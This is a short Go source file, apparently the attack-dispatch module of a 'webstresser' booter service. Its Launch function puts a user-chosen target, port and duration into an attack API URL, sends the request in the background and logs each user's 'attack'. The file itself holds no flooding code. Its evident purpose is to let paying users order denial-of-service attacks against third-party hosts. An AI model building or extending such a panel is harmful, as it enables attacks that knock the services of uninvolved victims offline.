package attack

import (
	"log"
	"net/http"
	"strings"
	"webstresser/internal/database"
)

type Manager struct {
	DB *database.DB
}

func NewManager(db *database.DB) *Manager {
	return &Manager{DB: db}
}

func (m *Manager) Launch(apiURL, target, port, duration string, userID int) {
	go func() {
		finalURL := strings.Replace(apiURL, "{target}", target, -1)
		finalURL = strings.Replace(finalURL, "{port}", port, -1)
		finalURL = strings.Replace(finalURL, "{duration}", duration, -1)

		log.Printf("User %d launching attack to %s", userID, finalURL)

		resp, err := http.Get(finalURL)
		if err != nil {
			log.Printf("Error launching attack for user %d: %v", userID, err)
			return
		}
		defer resp.Body.Close()

		if resp.StatusCode != http.StatusOK {
			log.Printf("Attack API returned non-200 status for user %d: %s", userID, resp.Status)
		} else {
			log.Printf("Attack successfully sent for user %d", userID)
		}
	}()
}
